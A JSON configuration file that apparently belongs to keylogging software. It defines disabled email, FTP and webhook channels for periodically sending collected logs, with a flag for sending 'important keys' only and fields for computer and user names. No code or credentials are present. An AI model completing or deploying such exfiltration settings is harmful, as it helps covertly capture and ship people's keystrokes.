{
  "EmailSettings": {
    "Enabled": false,
    "SmtpServer": "smtp.gmail.com",
    "SmtpPort": 587,
    "SenderEmail": "",
    "SenderPassword": "",
    "RecipientEmail": "",
    "SendIntervalMinutes": 30
  },
  "FtpSettings": {
    "Enabled": false,
    "Server": "",
    "Username": "",
    "Password": "",
    "RemoteDirectory": "/logs/",
    "UploadIntervalMinutes": 15
  },
  "WebhookSettings": {
    "Enabled": false,
    "WebhookUrl": "",
    "SendImportantKeysOnly": true
  },
  "GeneralSettings": {
    "ComputerName": "",
    "UserName": "",
    "MaxQueueSize": 1000,
    "EnableEncryption": false
  }
}
